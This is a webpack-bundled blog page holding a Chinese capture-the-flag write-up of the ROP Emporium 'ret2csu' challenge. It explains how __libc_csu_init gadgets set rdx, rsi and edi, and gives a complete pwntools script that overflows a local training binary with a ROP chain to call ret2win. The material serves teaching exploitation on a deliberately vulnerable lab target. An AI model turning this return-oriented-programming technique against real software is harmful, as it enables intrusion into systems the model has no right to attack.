(window.webpackJsonp=window.webpackJsonp||[]).push([[15],{424:function(a,s,t){"use strict";t.r(s);var n=t(2),r=Object(n.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h3",{attrs:{id:"题目"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#题目"}},[a._v("#")]),a._v(" 题目")]),a._v(" "),s("p",[a._v("今天尝试一下ROP Emporium中的ret2csu："),s("a",{attrs:{href:"https://ropemporium.com/challenge/ret2csu.html",target:"_blank",rel:"noopener noreferrer"}},[a._v("ret2csu"),s("OutboundLink")],1)]),a._v(" "),s("p",[a._v("下载好附件后，我们阅读一下题目要求：")]),a._v(" "),s("blockquote",[s("p",[a._v('This challenge is very similar to "callme", with the exception of the useful gadgets. Simply call the function in the accompanying library with same arguments that you used to beat the "callme" challenge ( for the ARM & MIPS binaries, for the x86_64 binary. '),s("code",[a._v("ret2win()``ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d)``ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)")])]),a._v(" "),s("p",[a._v("Populating the elusive 3rd register using ROP can prove more difficult than you might expect, especially in smaller binaries with fewer gadgets. This can become particularly irksome since many useful GLIBC functions require three arguments.")])]),a._v(" "),s("h3",{attrs:{id:"分析"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#分析"}},[a._v("#")]),a._v(" 分析")]),a._v(" "),s("p",[a._v("可以看到，题目的意思是让我们传入三个参数调用ret2win，即："),s("code",[a._v("ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)")]),a._v("。我们知道64位程序传入参数的方式是依靠寄存器实现的，即按照 "),s("code",[a._v("rdi，rsi，rdx，rcx，r8，r9")]),a._v("的顺序传递的，多余的参数再从栈上读取。传入前两个参数我们可以用ROPgadget中的：\n"),s("img",{attrs:{src:"https://my-picgo-1317641884.cos.ap-chengdu.myqcloud.com//202305181548570.png",alt:"1663999680221.png"}}),a._v("\n而最大的困难是在于传入第三个参数：rdx。我们可以发现，在ROPgadget中并没有与rdx有关的内容，那如何传入rdx呢？这里就要用到ret2csu的技巧了。")]),a._v(" "),s("p",[a._v("libc_csu_init是elf程序启动过程中的函数，linux程序启动过程如下：\n"),s("img",{attrs:{src:"https://my-picgo-1317641884.cos.ap-chengdu.myqcloud.com//202305181548571.png",alt:"1664001540337.png"}})]),a._v(" "),s("p",[a._v("因此，大部分程序中都含有这部分内容。用IDA反编译一下：\n"),s("img",{attrs:{src:"https://my-picgo-1317641884.cos.ap-chengdu.myqcloud.com//202305181548572.png",alt:"1664001669757.png"}})]),a._v(" "),s("p",[a._v("通过阅读这两部分的代码，我们发现，可以先执行gadget2来设置rsp，rbx，rbp等寄存器的值，然后再跳转至gadget1，通过 "),s("code",[a._v("r15--\x3erdx;r14--\x3ersi;r13d--\x3eedi")]),a._v("来控制rdx，rsi和edi。")]),a._v(" "),s("p",[a._v("这其中还有不少细节需要注意：")]),a._v(" "),s("ul",[s("li",[a._v("在gadget1中会调用frame_dummy_init_array函数，为了让程序正常运行，我们需要将r12设置为0x600DF0，rbx=0")]),a._v(" "),s("li",[a._v("这其中包含函数："),s("code",[a._v("cmp rbp,rbx;jnz short loc_400680")]),a._v("。当rbp==rbx时，函数才会向下执行，否则会一直循环，所以我们需要把rbx=0，rbp=1；")]),a._v(" "),s("li",[a._v("剩余没有用的寄存器用字符填充即可")]),a._v(" "),s("li",[a._v("在gadget1执行完后，会通过jnz跳转至gadget2，故需再设置一次寄存器值。")])]),a._v(" "),s("h3",{attrs:{id:"exp"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#exp"}},[a._v("#")]),a._v(" EXP")]),a._v(" "),s("p",[a._v("最后exp如下：")]),a._v(" "),s("div",{staticClass:"language-python line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-python"}},[s("code",[s("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("from")]),a._v(" pwn "),s("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("import")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("*")]),a._v("\ncontext"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("log_level"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'debug'")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v("arch"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"amd64"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v("os"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"linux"')]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\npwnfile "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"/image/ret2csu"')]),a._v("\nio "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" process"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("pwnfile"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\nelf "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" ELF"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("pwnfile"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\nrop "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" ROP"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("pwnfile"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\n\npadding "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0x28")]),a._v("\n\ncsu1_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0x400680")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[a._v("'''\nmov     rdx, r15\nmov     rsi, r14\nmov     edi, r13d\ncall    ds:(__frame_dummy_init_array_entry - 600DF0h)[r12+rbx*8]\nadd     rbx, 1\ncmp     rbp, rbx\njnz     short loc_400680\n'''")]),a._v("\ncsu2_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0x400696")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[a._v("'''\nloc_400696:\nadd     rsp, 8\npop     rbx\npop     rbp\npop     r12\npop     r13\npop     r14\npop     r15\nretn\n'''")]),a._v("\n\nwin_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0x400510")]),a._v("\narray_init_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0x600DF0")]),a._v("\npop_rdi_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0x4006a3")]),a._v("\npop_rsi_r15_addr "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0x4006a1")]),a._v(" \n\npayload "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('b"a"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("*")]),a._v("padding "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\n\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("csu2_addr"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("  "),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#进入第二个gadget，设置寄存器")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0xdeadbeef")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("   "),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#对应add rsp, 8")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("  "),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#rbx")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("  "),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#rbp")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("array_init_addr"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("  "),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#r12--\x3ecall array_init")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0xdeadbeef")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("  "),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#r13d--\x3eedi")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0xcafebabecafebabe")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("  "),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#r14--\x3ersi")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0xd00df00dd00df00d")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("  "),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#r15---\x3erdx")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("csu1_addr"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("  "),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#进入gadget1设置，但后面还会从gadget2中ret，所以要填充寄存器值")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('b"deadbeef"')]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("*")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("7")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("## 对应gadget2设置。")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("pop_rdi_addr"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0xdeadbeefdeadbeef")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("pop_rsi_r15_addr"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0xcafebabecafebabe")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("0xdeadbeef")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\npayload"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("+=")]),a._v("flat"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("win_addr"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\n\ndelimiter "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"> "')]),a._v("\nio"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(".")]),a._v("sendlineafter"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("delimiter "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" payload "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\nio"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(".")]),a._v("interactive"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br"),s("span",{staticClass:"line-number"},[a._v("8")]),s("br"),s("span",{staticClass:"line-number"},[a._v("9")]),s("br"),s("span",{staticClass:"line-number"},[a._v("10")]),s("br"),s("span",{staticClass:"line-number"},[a._v("11")]),s("br"),s("span",{staticClass:"line-number"},[a._v("12")]),s("br"),s("span",{staticClass:"line-number"},[a._v("13")]),s("br"),s("span",{staticClass:"line-number"},[a._v("14")]),s("br"),s("span",{staticClass:"line-number"},[a._v("15")]),s("br"),s("span",{staticClass:"line-number"},[a._v("16")]),s("br"),s("span",{staticClass:"line-number"},[a._v("17")]),s("br"),s("span",{staticClass:"line-number"},[a._v("18")]),s("br"),s("span",{staticClass:"line-number"},[a._v("19")]),s("br"),s("span",{staticClass:"line-number"},[a._v("20")]),s("br"),s("span",{staticClass:"line-number"},[a._v("21")]),s("br"),s("span",{staticClass:"line-number"},[a._v("22")]),s("br"),s("span",{staticClass:"line-number"},[a._v("23")]),s("br"),s("span",{staticClass:"line-number"},[a._v("24")]),s("br"),s("span",{staticClass:"line-number"},[a._v("25")]),s("br"),s("span",{staticClass:"line-number"},[a._v("26")]),s("br"),s("span",{staticClass:"line-number"},[a._v("27")]),s("br"),s("span",{staticClass:"line-number"},[a._v("28")]),s("br"),s("span",{staticClass:"line-number"},[a._v("29")]),s("br"),s("span",{staticClass:"line-number"},[a._v("30")]),s("br"),s("span",{staticClass:"line-number"},[a._v("31")]),s("br"),s("span",{staticClass:"line-number"},[a._v("32")]),s("br"),s("span",{staticClass:"line-number"},[a._v("33")]),s("br"),s("span",{staticClass:"line-number"},[a._v("34")]),s("br"),s("span",{staticClass:"line-number"},[a._v("35")]),s("br"),s("span",{staticClass:"line-number"},[a._v("36")]),s("br"),s("span",{staticClass:"line-number"},[a._v("37")]),s("br"),s("span",{staticClass:"line-number"},[a._v("38")]),s("br"),s("span",{staticClass:"line-number"},[a._v("39")]),s("br"),s("span",{staticClass:"line-number"},[a._v("40")]),s("br"),s("span",{staticClass:"line-number"},[a._v("41")]),s("br"),s("span",{staticClass:"line-number"},[a._v("42")]),s("br"),s("span",{staticClass:"line-number"},[a._v("43")]),s("br"),s("span",{staticClass:"line-number"},[a._v("44")]),s("br"),s("span",{staticClass:"line-number"},[a._v("45")]),s("br"),s("span",{staticClass:"line-number"},[a._v("46")]),s("br"),s("span",{staticClass:"line-number"},[a._v("47")]),s("br"),s("span",{staticClass:"line-number"},[a._v("48")]),s("br"),s("span",{staticClass:"line-number"},[a._v("49")]),s("br"),s("span",{staticClass:"line-number"},[a._v("50")]),s("br"),s("span",{staticClass:"line-number"},[a._v("51")]),s("br"),s("span",{staticClass:"line-number"},[a._v("52")]),s("br"),s("span",{staticClass:"line-number"},[a._v("53")]),s("br"),s("span",{staticClass:"line-number"},[a._v("54")]),s("br"),s("span",{staticClass:"line-number"},[a._v("55")]),s("br"),s("span",{staticClass:"line-number"},[a._v("56")]),s("br"),s("span",{staticClass:"line-number"},[a._v("57")]),s("br"),s("span",{staticClass:"line-number"},[a._v("58")]),s("br"),s("span",{staticClass:"line-number"},[a._v("59")]),s("br")])]),s("p",[a._v("不知道是什么原因，我的机器在运行后rsi=0，因此我用ROPgadget重新设置了rdi和rsi。最后flag：\n"),s("img",{attrs:{src:"https://my-picgo-1317641884.cos.ap-chengdu.myqcloud.com//202305181548573.png",alt:"1664002412978.png"}})])])}),[],!1,null,null,null);s.default=r.exports}}]);